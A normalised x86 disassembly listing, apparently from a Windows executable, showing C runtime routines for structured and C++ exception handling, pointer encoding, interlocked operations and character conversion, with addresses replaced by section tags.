or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
xor edx edx
div ecx
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_447b60
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_4268f3
mov esi [ eax ]
call sub_4268f3
push [ ebp + 0xc ]
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_449b3b
fstp [ ebp - 0x8 ]
pop ecx
pop ecx
call sub_4268f3
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
call sub_4268f3
fld [ r--data ]
mov [ eax ] esi
mov eax [ ebp + 0x10 ]
pop esi
jmp r-xdata
test eax eax
jg r-xdata
fld [ ebp - 0x8 ]
dec eax
fmul st1
fstp [ ebp - 0x8 ]
jns r-xdata
fstp st0
fld [ ebp - 0x8 ]
leave
retn
neg eax
dec eax
fld [ ebp - 0x8 ]
fdiv st1
fstp [ ebp - 0x8 ]
jne r-xdata
sub_447bc9
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_447b60
add esp 0x10
leave
retn
sub_447be6
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
push 0x1f
lea eax [ ebp - 0x23 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] 0x2e
call sub_44659f
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call sub_43e104
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x1c
call sub_4247dc
leave
retn
sub_447c28
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x3e
xor edx edx
pop ecx
div ecx
xor esi esi
lea eax [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
mov [ esi ] edi
call [ InterlockedCompareExchange@IAT ]
cmp eax edi
jne r-xdata
push 0xc
call sub_42acad
mov esi eax
pop ecx
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov ebx edi
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_447be6
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call sub_43d4d9
push esi
call sub_42578a
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_42578a
pop ecx
mov [ esi + 0x4 ] ebx
sub_447cc5
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_43d4d9
push esi
call sub_42578a
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_447d16
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
call sub_442adc
mov esi [ eax + 0x8 ]
call sub_442a90
jmp r-xdata
xor ecx ecx
mov [ eax ] cx
push [ ebp + 0xc ]
call sub_447c28
mov esi [ ebp + 0x14 ]
cmp [ esi ] 0x0
pop ecx
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] eax
test esi esi
jne r-xdata
test ebx ebx
jne r-xdata
mov al [ edi ]
push ebx
mov [ esi + 0x1 ] al
call sub_442a74
pop ecx
cmp eax 0x1
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx ecx [ edi ]
mov [ eax ] cx
movzx eax [ edi ]
mov ecx [ ebx + 0x4 ]
movzx eax [ ecx + eax + 0x1d ]
and eax 0x4
call sub_4338ad
movzx ecx [ edi ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
and [ esi ] 0x0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_442a74
pop ecx
cmp [ ebp + 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
push ebx
call sub_442a74
pop ecx
cmp eax 0x1
jle r-xdata
mov al [ edi ]
push 0xfffffffe
mov [ esi ] al
pop eax
jmp r-xdata
call sub_4268f3
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push ebx
call sub_442a74
pop ecx
push eax
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_442a74
pop ecx
jmp r-xdata
jmp r-xdata
sub_447e89
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ rw-data ]
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
pop ebp
jmp sub_42a03e
sub_447ee6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x2
pop edi
cmp [ esi ] edi
je r-xdata
pop edi
pop esi
pop ebp
retn
push 0x1
push esi
call [ InterlockedExchange@IAT ]
test eax eax
jne r-xdata
cmp eax edi
jne r-xdata
call [ ebp + 0xc ]
jmp r-xdata
cmp [ esi ] edi
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
sub_448118
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_44815f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_4481b3
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4498c6
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4481e9
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4498c6
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_44821f
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4498c6
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_448274
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_4247dc
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_4498c6
add esp 0x20
pop esi
pop ebp
retn
sub_4482a7
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_44837e
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_426c39
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_44837e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_4247dc
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_4498c6
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_4482a7
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_44815f
pop ebx
leave
retn
sub_44841d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_42b1e5
call sub_42b1e5
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_448490
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_426c39
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_426c39
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_4484bc
mov edi edi
push ebp
mov ebp esp
call sub_426c39
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_4484e3
mov edi edi
push ebp
mov ebp esp
push esi
call sub_426c39
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_426c39
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_426c39
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_42b1e5
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_448535
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_448274
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_449b60
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_448595
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_4485c8
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_4485fe
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_448634
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_44869f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_449bac
mov esi [ eax ]
call sub_449bac
cmp esi [ eax ]
jl r-xdata
call sub_449bb2
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_4486c7
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_426bc0
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_44869f
push eax
push edi
push esi
call sub_427b7a
add esp 0x10
test eax eax
jne r-xdata
push 0x1
push edi
call sub_42acf2
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4296a0
int3
mov eax esi
jmp r-xdata
mov eax r--data
pop edi
sub_448731
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jbe r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
call sub_42970c
mov eax esi
lea eax [ esi - 0x1 ]
push eax
push [ ebp + 0x10 ]
call sub_44869f
pop ecx
push eax
push esi
push [ ebp + 0x8 ]
call sub_4376b2
add esp 0x10
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
retn
push edi
push edi
push edi
push edi
push edi
call sub_4296a0
int3
sub_448784
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_4252f8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4487ad
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_425354
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4487d4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_427fd0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_448833
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_426c39
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_426c39
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_426c39
and [ eax + 0x90 ] 0x0
jmp sub_42b199
sub_448882
push 0x10
push r--data
call sub_4278c0
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_448944
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_426c39
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_427905
retn
call sub_42b1e5
call sub_42b1e5
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_449b60
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_44895e
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_426c39
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_4489a3
push 0x8
push r--data
call sub_4278c0
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_427905
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_44814a
mov [ ebp - 0x4 ] 0xfffffffe
sub_4489f8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_448a32
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
test eax eax
je r-xdata
or [ edi + 0x8 ] 0xffffffff
or [ edi + 0xc ] 0xffffffff
mov esi [ eax ]
test esi esi
je r-xdata
xor eax eax
inc eax
pop ebp
retn
call sub_426c39
and [ eax + 0x90 ] 0x0
cmp [ esi ] 0xe06d7363
jne r-xdata
push [ esi + 0x18 ]
push edi
call sub_448490
pop ecx
pop ecx
call sub_426c39
mov eax [ eax + 0x88 ]
mov [ edi + 0x8 ] eax
call sub_426c39
mov eax [ eax + 0x8c ]
mov [ edi + 0xc ] eax
call sub_426c39
mov [ eax + 0x88 ] esi
jmp r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_426c39
dec [ eax + 0x90 ]
call sub_426c39
cmp [ eax + 0x90 ] 0x0
pop edi
pop esi
jge r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
call sub_426c39
mov esi [ eax + 0x88 ]
cmp eax 0x19930522
jne r-xdata
sub_448ae8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_426c39
inc [ eax + 0x90 ]
xor eax eax
inc eax
pop ebp
retn
cmp ecx 0x19930522
jne r-xdata
sub_448b39
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
push ebx
push edi
push esi
call sub_4484e3
cmp [ ebp + 0xc ] 0x0
pop ecx
mov edi 0xe06d7363
mov ebx 0x19930520
jne r-xdata
call sub_426c39
mov eax [ eax + 0x88 ]
cmp [ eax ] edi
jne r-xdata
call sub_426c39
mov eax [ eax + 0x88 ]
cmp [ eax ] edi
jne r-xdata
call sub_426c39
mov ecx [ esi + 0x8 ]
mov [ eax + 0x88 ] ecx
call sub_426c39
mov ecx [ esi + 0xc ]
pop edi
mov [ eax + 0x8c ] ecx
pop ebx
call sub_426c39
mov eax [ eax + 0x88 ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
call sub_426c39
mov eax [ eax + 0x88 ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
call sub_426c39
mov eax [ eax + 0x88 ]
cmp [ eax + 0x14 ] ebx
je r-xdata
call sub_426c39
mov eax [ eax + 0x88 ]
cmp [ eax + 0x14 ] ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_426c39
mov eax [ eax + 0x88 ]
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_426c39
mov eax [ eax + 0x88 ]
push [ eax + 0x18 ]
call sub_4484bc
pop ecx
test eax eax
je r-xdata
call sub_426c39
mov eax [ eax + 0x88 ]
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_426c39
dec [ eax + 0x90 ]
call sub_426c39
mov eax [ eax + 0x88 ]
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
push 0x1
call sub_426c39
push [ eax + 0x88 ]
call sub_4489a3
pop ecx
pop ecx
call sub_426c39
mov eax [ eax + 0x88 ]
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_448d12
push 0x8
push r--data
call sub_4278c0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427905
retn
sub_448d4d
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_42b1e5
mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_4487d4
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_448e0e
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ esi ] ebx
jle r-xdata
xor al al
mov eax [ esi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_425554
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
inc edi
add ebx 0x10
cmp edi [ esi ]
jl r-xdata
pop edi
pop ebx
retn
sub_448e3e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
jne r-xdata
mov esi [ esi ]
test esi esi
jne r-xdata
call sub_42b1e5
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_42b1e5
call sub_42b1e5
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
mov edi [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
cmp eax 0x19930521
je r-xdata
test edi edi
jg r-xdata
